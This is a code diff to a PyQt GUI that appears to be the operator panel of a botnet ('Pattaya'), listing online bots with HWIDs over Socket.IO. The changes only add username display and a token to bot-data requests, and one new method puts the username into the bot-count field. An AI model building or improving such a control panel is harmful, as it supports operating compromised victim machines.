@@ -18,10 +18,10 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         super().__init__()
         self.setupUi(self)
         self.app = app
-
+        self.panel_username = "unknown"
         self.backup_title = self.windowTitle()
         self.old_title = self.windowTitle()
-        self.update_title = self.old_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(0))
+        self.update_title = self.old_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(0)).replace('$PANEL_USER', self.panel_username)
         self.setWindowTitle(self.update_title)
         self.setMaximumSize(16777215, 16777215)
         self.settings = QSettings("unknownclub.net", "Pattaya")
@@ -31,6 +31,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
         
         self.url = ""
         self.token = ""
+        
 
         self.about_dialog = AboutPattayaWidget()
         self.about_dialog.setWindowModality(Qt.WindowModality.ApplicationModal)
@@ -81,6 +82,7 @@ class MainWindow(QMainWindow, Ui_MainWindow):
 
 
         self.socket_io_client.panel_received_bot_count_data.connect(self.update_online_bot)
+        self.socket_io_client.panel_received_username.connect(self.update_username)
 
         # Create a context menu with an action to print the selected row data
         self.context_menu = QMenu(self.bot_table_view)
@@ -139,7 +141,12 @@ class MainWindow(QMainWindow, Ui_MainWindow):
             self.bot_table_view.setDisabled(True)
         else:
             self.bot_table_view.setDisabled(False)
-        self.update_title = self.backup_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(data))
+        self.update_title = self.backup_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(data)).replace('$PANEL_USER', self.panel_username)
+        self.setWindowTitle(self.update_title)
+
+    def update_username(self, data):
+        self.panel_username = data
+        self.update_title = self.backup_title.replace('$VERSION', PATTAYA_PANEL_VERSION).replace('$ONLINE_BOT', str(data)).replace('$PANEL_USER', self.panel_username)
         self.setWindowTitle(self.update_title)
 
 
@@ -226,6 +233,7 @@ HWID -> {item['hwid']}
         self.actionStart.setDisabled(False)
         self.actionStop.setDisabled(True)
         self.actionRefresh_Bot.setDisabled(True)
+        self.setWindowTitle(self.windowTitle().replace(self.panel_username, 'DISCONNECTED'))
 
 
     def updateStats(self):
@@ -251,7 +259,7 @@ HWID -> {item['hwid']}
 
 
     def refresh_bot(self):
-        self.socket_io_client.socket_io.emit("panel_request_bot_data")
+        self.socket_io_client.socket_io.emit("panel_request_bot_data", {"token": self.token})
 
 
     def encode_file_base64(self):
